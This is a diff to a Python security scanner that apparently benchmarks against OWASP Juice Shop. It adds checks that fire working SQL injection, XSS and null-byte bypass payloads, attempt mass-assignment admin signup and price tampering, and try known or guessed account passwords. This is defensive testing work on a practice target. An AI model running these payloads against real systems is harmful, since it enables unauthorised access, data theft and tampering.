@@ -1,7 +1,7 @@
 """
 Juice Shop Benchmark Scanner — targeted tests for OWASP Juice Shop.
 
-Auth-aware scanner that registers/logs in, then tests 25+ specific
+Auth-aware scanner that registers/logs in, then tests 50+ specific
 vulnerability patterns known to exist in OWASP Juice Shop.
 Each check is a separate method returning True if the vuln was found.
 
@@ -178,6 +178,24 @@ class JuiceShopScanner(BaseScanner):
         self._test_video_xss(target)
         self._test_privacy_policy(target)
         self._test_blockchain_address(target)
+
+        # Phase 10: Extended vulnerability checks
+        self._test_forged_coupon_codes(target)
+        self._test_easter_egg_null_byte(target)
+        self._test_exposed_backup_files(target)
+        self._test_login_mc_safesearch(target)
+        self._test_login_amy(target)
+        self._test_reflected_xss_track_order(target)
+        self._test_dom_xss_search(target)
+        self._test_mass_assignment_admin(target)
+        self._test_captcha_bypass_feedback(target)
+        self._test_exposed_encryption_keys(target)
+        self._test_two_factor_bypass(target)
+        self._test_exposed_language_files(target)
+        self._test_database_schema_error(target)
+        self._test_manipulated_product_price(target)
+        self._test_exposed_support_chat(target)
+        self._test_login_admin_password(target)
 
     # ── Injection checks ────────────────────────────────────────────
 
@@ -1612,4 +1630,728 @@ class JuiceShopScanner(BaseScanner):
                                  evidence="GET /api/Addresss returned 200", url=f"{target}/api/Addresss", cwe="CWE-200")
                 return True
         except Exception: pass
+        return False
+
+    # ── Phase 10: Extended vulnerability checks ───────────────────
+
+    def _test_forged_coupon_codes(self, target: str) -> bool:
+        """Test known Juice Shop coupon codes from challenge list."""
+        known_coupons = [
+            "WMNSDY2019-80",
+            "ORANGE2020-40",
+            "WMNSDY2021-60",
+            "GIVESOME-10",
+            "LABOR2022-10",
+        ]
+        for coupon in known_coupons:
+            try:
+                resp = self.http_client.put(
+                    f"{target}/rest/basket/1/coupon/{coupon}",
+                    headers=self._auth_headers(),
+                    timeout=5,
+                )
+                if resp.status_code == 200 and "discount" in resp.text.lower():
+                    self.add_finding(
+                        title=f"Forged Coupon Code Accepted: {coupon}",
+                        severity=Severity.MEDIUM,
+                        description=(
+                            f"Known challenge coupon code '{coupon}' was accepted, "
+                            f"granting an unauthorized discount."
+                        ),
+                        recommendation="Expire old coupons and use unpredictable codes.",
+                        evidence=(
+                            f"PUT /rest/basket/1/coupon/{coupon} returned 200\n"
+                            f"Response: {resp.text[:200]}"
+                        ),
+                        url=f"{target}/rest/basket/1/coupon/{coupon}",
+                        cwe="CWE-284",
+                    )
+                    return True
+            except Exception:
+                continue
+        return False
+
+    def _test_easter_egg_null_byte(self, target: str) -> bool:
+        """Test access to easter egg file via null byte bypass."""
+        payloads = [
+            "/ftp/eastere.gg%2500.md",
+            "/ftp/eastere.gg%00.md",
+            "/ftp/eastere.gg%2500.pdf",
+        ]
+        for path in payloads:
+            try:
+                resp = self.http_client.get(f"{target}{path}", timeout=5)
+                if resp.status_code == 200 and len(resp.text) > 10:
+                    self.add_finding(
+                        title="Easter Egg File Accessible via Null Byte Bypass",
+                        severity=Severity.HIGH,
+                        description=(
+                            "The easter egg file (eastere.gg) is blocked by file extension "
+                            "filter but accessible via null byte injection in the path."
+                        ),
+                        recommendation="Sanitize null bytes from URL paths before file resolution.",
+                        evidence=(
+                            f"GET {path} returned 200 ({len(resp.text)} bytes)\n"
+                            f"Preview: {resp.text[:200]}"
+                        ),
+                        url=f"{target}{path}",
+                        cwe="CWE-158",
+                    )
+                    return True
+            except Exception:
+                continue
+        return False
+
+    def _test_exposed_backup_files(self, target: str) -> bool:
+        """Test for exposed backup files in /ftp via null byte bypass."""
+        backup_paths = [
+            ("/ftp/package.json.bak%2500.md", "package.json.bak"),
+            ("/ftp/coupons_2013.md.bak%2500.md", "coupons_2013.md.bak"),
+            ("/ftp/suspicious_errors.yml%2500.md", "suspicious_errors.yml"),
+        ]
+        found = False
+        for path, filename in backup_paths:
+            try:
+                resp = self.http_client.get(f"{target}{path}", timeout=5)
+                if resp.status_code == 200 and len(resp.text) > 10:
+                    self.add_finding(
+                        title=f"Backup File Accessible: {filename}",
+                        severity=Severity.HIGH,
+                        description=(
+                            f"Backup file '{filename}' is accessible via null byte bypass. "
+                            f"May contain sensitive configuration or coupon data."
+                        ),
+                        recommendation="Remove backup files from public directories.",
+                        evidence=(
+                            f"GET {path} returned 200 ({len(resp.text)} bytes)\n"
+                            f"Preview: {resp.text[:200]}"
+                        ),
+                        url=f"{target}{path}",
+                        cwe="CWE-530",
+                    )
+                    found = True
+            except Exception:
+                continue
+        return found
+
+    def _test_login_mc_safesearch(self, target: str) -> bool:
+        """Test login as MC SafeSearch with known password from challenge."""
+        try:
+            resp = self.http_client.post(
+                f"{target}/rest/user/login",
+                json={
+                    "email": "mc.safesearch@juice-sh.op",
+                    "password": "Mr. N00dles",
+                },
+                headers={"Content-Type": "application/json"},
+                timeout=10,
+            )
+            data = json.loads(resp.text) if resp.text else {}
+            if resp.status_code == 200 and "token" in data.get("authentication", {}):
+                self.add_finding(
+                    title="Login as MC SafeSearch with Known Password",
+                    severity=Severity.HIGH,
+                    description=(
+                        "MC SafeSearch's account uses a publicly known password "
+                        "('Mr. N00dles') derived from his YouTube rap about password safety."
+                    ),
+                    recommendation="Enforce password policies that prevent well-known passwords.",
+                    evidence=(
+                        f"POST /rest/user/login with mc.safesearch@juice-sh.op\n"
+                        f"Password 'Mr. N00dles' returned valid token."
+                    ),
+                    url=f"{target}/rest/user/login",
+                    cwe="CWE-521",
+                )
+                return True
+        except Exception:
+            pass
+        return False
+
+    def _test_login_amy(self, target: str) -> bool:
+        """Test login as Amy with known password patterns."""
+        passwords = [
+            "K1f.....................",
+            "K1f",
+            "K1fL0v3sB3worx",
+            "K1fBl4worx",
+        ]
+        for password in passwords:
+            try:
+                resp = self.http_client.post(
+                    f"{target}/rest/user/login",
+                    json={
+                        "email": "amy@juice-sh.op",
+                        "password": password,
+                    },
+                    headers={"Content-Type": "application/json"},
+                    timeout=10,
+                )
+                data = json.loads(resp.text) if resp.text else {}
+                if resp.status_code == 200 and "token" in data.get("authentication", {}):
+                    self.add_finding(
+                        title="Login as Amy with Guessed Password",
+                        severity=Severity.HIGH,
+                        description=(
+                            f"Amy's account password was guessable. "
+                            f"Password hint in Kif Kroker's backstory was enough to derive it."
+                        ),
+                        recommendation="Enforce strong password policies.",
+                        evidence=(
+                            f"POST /rest/user/login with amy@juice-sh.op\n"
+                            f"Password '{password}' returned valid token."
+                        ),
+                        url=f"{target}/rest/user/login",
+                        cwe="CWE-521",
+                    )
+                    return True
+            except Exception:
+                continue
+        return False
+
+    def _test_reflected_xss_track_order(self, target: str) -> bool:
+        """Test reflected XSS in track order endpoint with iframe payload."""
+        payloads = [
+            'test<iframe src="javascript:alert(1)">',
+            '<img src=x onerror=alert(1)>',
+            '<svg onload=alert(1)>',
+        ]
+        for payload in payloads:
+            try:
+                resp = self.http_client.get(
+                    f"{target}/rest/track-order/{quote(payload)}",
+                    timeout=5,
+                )
+                if resp.status_code == 200 and (
+                    "<iframe" in resp.text or "<img" in resp.text or "<svg" in resp.text
+                ):
+                    self.add_finding(
+                        title="Reflected XSS in Order Tracking (HTML Tags Reflected)",
+                        severity=Severity.HIGH,
+                        description=(
+                            "The track order endpoint reflects HTML tags in the response "
+                            "without sanitization, enabling reflected XSS attacks."
+                        ),
+                        recommendation="HTML-encode all user input in API responses.",
+                        evidence=(
+                            f"GET /rest/track-order/{payload}\n"
+                            f"HTML tag reflected in response body.\n"
+                            f"Response: {resp.text[:300]}"
+                        ),
+                        url=f"{target}/rest/track-order/",
+                        cwe="CWE-79",
+                    )
+                    return True
+            except Exception:
+                continue
+        return False
+
+    def _test_dom_xss_search(self, target: str) -> bool:
+        """Test DOM-based XSS via search query parameter."""
+        payloads = [
+            '<img src=x onerror=alert("XSS")>',
+            '<svg/onload=alert(1)>',
+            '"><script>alert(1)</script>',
+        ]
+        for payload in payloads:
+            try:
+                resp = self.http_client.get(
+                    f"{target}/#/search?q={quote(payload)}",
+                    timeout=5,
+                )
+                # SPA will return 200 regardless; check if the API search
+                # reflects the payload
+                api_resp = self.http_client.get(
+                    f"{target}/rest/products/search?q={quote(payload)}",
+                    timeout=5,
+                )
+                if api_resp.status_code == 200 and (
+                    "<img" in api_resp.text
+                    or "<svg" in api_resp.text
+                    or "<script" in api_resp.text
+                ):
+                    self.add_finding(
+                        title="DOM-based XSS via Search Query",
+                        severity=Severity.HIGH,
+                        description=(
+                            "Search query parameter is reflected in the API response "
+                            "without encoding. The Angular frontend may render this as DOM XSS."
+                        ),
+                        recommendation="Sanitize search input server-side and HTML-encode output.",
+                        evidence=(
+                            f"GET /rest/products/search?q={payload}\n"
+                            f"HTML payload present in response.\n"
+                            f"Response: {api_resp.text[:300]}"
+                        ),
+                        url=f"{target}/#/search",
+                        cwe="CWE-79",
+                    )
+                    return True
+            except Exception:
+                continue
+        return False
+
+    def _test_mass_assignment_admin(self, target: str) -> bool:
+        """Test mass assignment by registering user with admin role."""
+        payloads = [
+            {
+                "email": "massassign1@test.com",
+                "password": "test1234",
+                "passwordRepeat": "test1234",
+                "role": "admin",
+                "securityQuestion": {
+                    "id": 1,
+                    "question": "Your eldest siblings middle name?",
+                    "createdAt": "2024-01-01T00:00:00.000Z",
+                    "updatedAt": "2024-01-01T00:00:00.000Z",
+                },
+                "securityAnswer": "test",
+            },
+            {
+                "email": "massassign2@test.com",
+                "password": "test1234",
+                "passwordRepeat": "test1234",
+                "isAdmin": True,
+                "securityQuestion": {
+                    "id": 1,
+                    "question": "Your eldest siblings middle name?",
+                    "createdAt": "2024-01-01T00:00:00.000Z",
+                    "updatedAt": "2024-01-01T00:00:00.000Z",
+                },
+                "securityAnswer": "test",
+            },
+        ]
+        for payload in payloads:
+            try:
+                resp = self.http_client.post(
+                    f"{target}/api/Users",
+                    json=payload,
+                    headers={"Content-Type": "application/json"},
+                    timeout=10,
+                )
+                if resp.status_code in (200, 201):
+                    data = json.loads(resp.text) if resp.text else {}
+                    created = data.get("data", {})
+                    if created.get("role") == "admin" or created.get("isAdmin") is True:
+                        self.add_finding(
+                            title="Mass Assignment — Admin Role via Registration",
+                            severity=Severity.CRITICAL,
+                            description=(
+                                "User registration accepts 'role' or 'isAdmin' fields, "
+                                "allowing privilege escalation to admin on signup."
+                            ),
+                            recommendation=(
+                                "Use an allowlist of accepted fields in registration. "
+                                "Never bind role/admin fields from user input."
+                            ),
+                            evidence=(
+                                f"POST /api/Users with extra fields\n"
+                                f"Created user: {json.dumps(created)[:300]}"
+                            ),
+                            url=f"{target}/api/Users",
+                            cwe="CWE-915",
+                        )
+                        return True
+                    # Even if role is not reflected, the field was accepted
+                    if resp.status_code in (200, 201):
+                        self.add_finding(
+                            title="Mass Assignment — Extra Fields Accepted in Registration",
+                            severity=Severity.MEDIUM,
+                            description=(
+                                "User registration endpoint accepts extra fields beyond "
+                                "the expected set (role, isAdmin). This may enable privilege escalation."
+                            ),
+                            recommendation="Whitelist accepted registration fields server-side.",
+                            evidence=(
+                                f"POST /api/Users with role/isAdmin returned {resp.status_code}\n"
+                                f"Response: {resp.text[:300]}"
+                            ),
+                            url=f"{target}/api/Users",
+                            cwe="CWE-915",
+                        )
+                        return True
+            except Exception:
+                continue
+        return False
+
+    def _test_captcha_bypass_feedback(self, target: str) -> bool:
+        """Test submitting feedback without solving CAPTCHA at all."""
+        try:
+            resp = self.http_client.post(
+                f"{target}/api/Feedbacks",
+                json={
+                    "comment": "no captcha test (secprobe)",
+                    "rating": 3,
+                },
+                headers=self._auth_headers(),
+                timeout=10,
+            )
+            if resp.status_code in (200, 201):
+                self.add_finding(
+                    title="CAPTCHA Bypass — Feedback Without CAPTCHA Fields",
+                    severity=Severity.MEDIUM,
+                    description=(
+                        "Feedback can be submitted without providing any CAPTCHA data. "
+                        "The captchaId and captcha fields are not required server-side."
+                    ),
+                    recommendation="Require and validate CAPTCHA on all feedback submissions.",
+                    evidence=(
+                        f"POST /api/Feedbacks without captchaId/captcha accepted.\n"
+                        f"Status: {resp.status_code}\n"
+                        f"Response: {resp.text[:200]}"
+                    ),
+                    url=f"{target}/api/Feedbacks",
+                    cwe="CWE-804",
+                )
+                return True
+        except Exception:
+            pass
+        return False
+
+    def _test_exposed_encryption_keys(self, target: str) -> bool:
+        """Test for exposed encryption keys directory."""
+        paths = [
+            "/encryptionkeys",
+            "/encryptionkeys/",
+            "/encryptionkeys/jwt.pub",
+            "/encryptionkeys/server.key",
+            "/encryptionkeys/premium.key",
+        ]
+        for path in paths:
+            try:
+                resp = self.http_client.get(f"{target}{path}", timeout=5)
+                if resp.status_code == 200 and len(resp.text) > 5:
+                    self.add_finding(
+                        title=f"Exposed Encryption Keys: {path}",
+                        severity=Severity.CRITICAL,
+                        description=(
+                            f"Encryption key file or directory at {path} is publicly accessible. "
+                            f"This may expose JWT signing keys or TLS private keys."
+                        ),
+                        recommendation="Never serve encryption keys via the web server.",
+                        evidence=(
+                            f"GET {path} returned 200 ({len(resp.text)} bytes)\n"
+                            f"Preview: {resp.text[:200]}"
+                        ),
+                        url=f"{target}{path}",
+                        cwe="CWE-320",
+                    )
+                    return True
+            except Exception:
+                continue
+        return False
+
+    def _test_two_factor_bypass(self, target: str) -> bool:
+        """Test if two-factor authentication can be bypassed."""
+        if not self._auth_token:
+            return False
+        try:
+            # Check if TOTP setup is accessible and can be manipulated
+            resp = self.http_client.post(
+                f"{target}/rest/2fa/setup",
+                json={"password": self._auth_password, "setupToken": "", "initialToken": ""},
+                headers=self._auth_headers(),
+                timeout=10,
+            )
+            if resp.status_code == 200:
+                self.add_finding(
+                    title="Two-Factor Authentication Setup Accessible",
+                    severity=Severity.MEDIUM,
+                    description=(
+                        "2FA setup endpoint is accessible and may reveal TOTP secrets. "
+                        "An attacker with a valid token could reset or view 2FA configuration."
+                    ),
+                    recommendation="Require re-authentication before 2FA setup changes.",
+                    evidence=(
+                        f"POST /rest/2fa/setup returned 200\n"
+                        f"Response: {resp.text[:300]}"
+                    ),
+                    url=f"{target}/rest/2fa/setup",
+                    cwe="CWE-308",
+                )
+                return True
+
+            # Try disabling 2FA
+            resp = self.http_client.post(
+                f"{target}/rest/2fa/disable",
+                json={"password": self._auth_password},
+                headers=self._auth_headers(),
+                timeout=10,
+            )
+            if resp.status_code == 200:
+                self.add_finding(
+                    title="Two-Factor Authentication Can Be Disabled",
+                    severity=Severity.MEDIUM,
+                    description="2FA can be disabled via API without TOTP verification.",
+                    recommendation="Require current TOTP token to disable 2FA.",
+                    evidence=(
+                        f"POST /rest/2fa/disable returned 200\n"
+                        f"Response: {resp.text[:300]}"
+                    ),
+                    url=f"{target}/rest/2fa/disable",
+                    cwe="CWE-308",
+                )
+                return True
+
+            # Check /rest/2fa/status
+            resp = self.http_client.get(
+                f"{target}/rest/2fa/status",
+                headers=self._auth_headers(),
+                timeout=5,
+            )
+            if resp.status_code == 200:
+                self.add_finding(
+                    title="2FA Status Endpoint Exposes Configuration",
+                    severity=Severity.LOW,
+                    description="2FA status endpoint reveals whether 2FA is enabled for the user.",
+                    recommendation="Do not expose 2FA status without re-authentication.",
+                    evidence=(
+                        f"GET /rest/2fa/status returned 200\n"
+                        f"Response: {resp.text[:300]}"
+                    ),
+                    url=f"{target}/rest/2fa/status",
+                    cwe="CWE-308",
+                )
+                return True
+        except Exception:
+            pass
+        return False
+
+    def _test_exposed_language_files(self, target: str) -> bool:
+        """Test for exposed i18n language files leaking information."""
+        lang_paths = [
+            "/i18n/en.json",
+            "/i18n/de.json",
+            "/i18n/zh.json",
+            "/i18n/tlh.json",
+        ]
+        for path in lang_paths:
+            try:
+                resp = self.http_client.get(f"{target}{path}", timeout=5)
+                if resp.status_code == 200 and len(resp.text) > 50:
+                    data = json.loads(resp.text) if resp.text else {}
+                    # Check for keys that leak internal info
+                    leaked_keys = [
+                        k for k in data
+                        if any(
+                            word in k.lower()
+                            for word in ("admin", "secret", "challenge", "hack", "score")
+                        )
+                    ]
+                    self.add_finding(
+                        title=f"Exposed Language File: {path}",
+                        severity=Severity.LOW,
+                        description=(
+                            f"Internationalization file {path} is publicly accessible "
+                            f"and contains {len(data)} translation keys. "
+                            f"Leaked internal keys: {leaked_keys[:10] if leaked_keys else 'none detected'}."
+                        ),
+                        recommendation="Serve only necessary translations. Remove challenge hints from i18n files.",
+                        evidence=(
+                            f"GET {path} returned 200 ({len(resp.text)} bytes)\n"
+                            f"Keys with hints: {leaked_keys[:5]}"
+                        ),
+                        url=f"{target}{path}",
+                        cwe="CWE-200",
+                    )
+                    return True
+            except Exception:
+                continue
+        return False
+
+    def _test_database_schema_error(self, target: str) -> bool:
+        """Trigger SQL errors that reveal database table/column names."""
+        payloads = [
+            "/rest/products/search?q='))UNION+SELECT+sql,2,3,4,5,6,7,8,9+FROM+sqlite_master--",
+            "/rest/products/search?q='))UNION+SELECT+name,2,3,4,5,6,7,8,9+FROM+sqlite_master--",
+            "/rest/products/search?q=')+AND+1=CAST((SELECT+sql+FROM+sqlite_master+LIMIT+1)+AS+INT)--",
+        ]
+        for path in payloads:
+            try:
+                resp = self.http_client.get(f"{target}{path}", timeout=10)
+                text = resp.text.lower() if resp.text else ""
+                if resp.status_code in (200, 500) and (
+                    "create table" in text
+                    or "sqlite_master" in text
+                    or "users" in text and "products" in text
+                    or "baskets" in text
+                ):
+                    self.add_finding(
+                        title="Database Schema Leak via SQL Error/Injection",
+                        severity=Severity.CRITICAL,
+                        description=(
+                            "SQL injection or error messages reveal database schema information "
+                            "including table names and column definitions."
+                        ),
+                        recommendation="Use parameterized queries. Suppress detailed SQL errors in production.",
+                        evidence=(
+                            f"GET {path}\nStatus: {resp.status_code}\n"
+                            f"Schema info in response: {resp.text[:400]}"
+                        ),
+                        url=f"{target}/rest/products/search",
+                        cwe="CWE-209",
+                    )
+                    return True
+            except Exception:
+                continue
+        return False
+
+    def _test_manipulated_product_price(self, target: str) -> bool:
+        """Test if product price can be modified via PUT request."""
+        try:
+            # First get the current product
+            get_resp = self.http_client.get(f"{target}/api/Products/1", timeout=5)
+            if get_resp.status_code != 200:
+                return False
+
+            data = json.loads(get_resp.text) if get_resp.text else {}
+            original = data.get("data", {})
+            original_price = original.get("price", 0)
+
+            # Try to modify the price
+            resp = self.http_client.put(
+                f"{target}/api/Products/1",
+                json={"price": 0.01},
+                headers=self._auth_headers(),
+                timeout=5,
+            )
+            if resp.status_code == 200:
+                updated = json.loads(resp.text) if resp.text else {}
+                new_price = updated.get("data", {}).get("price", original_price)
+                self.add_finding(
+                    title="Product Price Manipulation via API",
+                    severity=Severity.CRITICAL,
+                    description=(
+                        f"Product price can be modified via PUT /api/Products/1. "
+                        f"Original price: {original_price}, attempted: 0.01, "
+                        f"result: {new_price}."
+                    ),
+                    recommendation="Restrict product modification to admin users only.",
+                    evidence=(
+                        f"PUT /api/Products/1 with price=0.01 returned 200\n"
+                        f"Response: {resp.text[:300]}"
+                    ),
+                    url=f"{target}/api/Products/1",
+                    cwe="CWE-284",
+                )
+                # Restore the original price
+                try:
+                    self.http_client.put(
+                        f"{target}/api/Products/1",
+                        json={"price": original_price},
+                        headers=self._auth_headers(),
+                        timeout=5,
+                    )
+                except Exception:
+                    pass
+                return True
+        except Exception:
+            pass
+        return False
+
+    def _test_exposed_support_chat(self, target: str) -> bool:
+        """Test for exposed chatbot/support chat endpoints."""
+        endpoints = [
+            "/rest/chatbot/status",
+            "/rest/chatbot/respond",
+            "/api/Chatbots",
+            "/api/Chatbots/1",
+            "/support/logs",
+        ]
+        for path in endpoints:
+            try:
+                resp = self.http_client.get(
+                    f"{target}{path}",
+                    headers=self._auth_headers(),
+                    timeout=5,
+                )
+                if resp.status_code == 200 and len(resp.text) > 5:
+                    self.add_finding(
+                        title=f"Exposed Support Chat Endpoint: {path}",
+                        severity=Severity.MEDIUM,
+                        description=(
+                            f"Support chat endpoint {path} is accessible. "
+                            f"May expose chatbot configuration, training data, or user conversations."
+                        ),
+                        recommendation="Restrict chatbot admin endpoints to authorized users.",
+                        evidence=(
+                            f"GET {path} returned 200 ({len(resp.text)} bytes)\n"
+                            f"Preview: {resp.text[:200]}"
+                        ),
+                        url=f"{target}{path}",
+                        cwe="CWE-200",
+                    )
+                    return True
+            except Exception:
+                continue
+
+        # Also try POST to chatbot
+        try:
+            resp = self.http_client.post(
+                f"{target}/rest/chatbot/respond",
+                json={"action": "query", "query": "coupon code"},
+                headers=self._auth_headers(),
+                timeout=5,
+            )
+            if resp.status_code == 200 and len(resp.text) > 5:
+                self.add_finding(
+                    title="Support Chatbot Responds to Queries",
+                    severity=Severity.MEDIUM,
+                    description=(
+                        "The support chatbot responds to arbitrary queries and may "
+                        "be tricked into revealing coupon codes or internal information."
+                    ),
+                    recommendation="Restrict chatbot responses. Do not leak sensitive data via chatbot.",
+                    evidence=(
+                        f"POST /rest/chatbot/respond returned 200\n"
+                        f"Response: {resp.text[:300]}"
+                    ),
+                    url=f"{target}/rest/chatbot/respond",
+                    cwe="CWE-200",
+                )
+                return True
+        except Exception:
+            pass
+        return False
+
+    def _test_login_admin_password(self, target: str) -> bool:
+        """Test login as admin with common/known passwords."""
+        admin_passwords = [
+            "admin123",
+            "admin12345",
+            "password",
+            "admin",
+            "1234567890",
+        ]
+        for password in admin_passwords:
+            try:
+                resp = self.http_client.post(
+                    f"{target}/rest/user/login",
+                    json={
+                        "email": "admin@juice-sh.op",
+                        "password": password,
+                    },
+                    headers={"Content-Type": "application/json"},
+                    timeout=10,
+                )
+                data = json.loads(resp.text) if resp.text else {}
+                if resp.status_code == 200 and "token" in data.get("authentication", {}):
+                    self.add_finding(
+                        title="Admin Account Uses Weak Password",
+                        severity=Severity.CRITICAL,
+                        description=(
+                            f"Admin account (admin@juice-sh.op) uses a weak, guessable "
+                            f"password: '{password}'. This allows full administrative access."
+                        ),
+                        recommendation="Enforce strong passwords for admin accounts.",
+                        evidence=(
+                            f"POST /rest/user/login with admin@juice-sh.op\n"
+                            f"Password '{password}' returned valid admin token."
+                        ),
+                        url=f"{target}/rest/user/login",
+                        cwe="CWE-521",
+                    )
+                    return True
+            except Exception:
+                continue
         return False
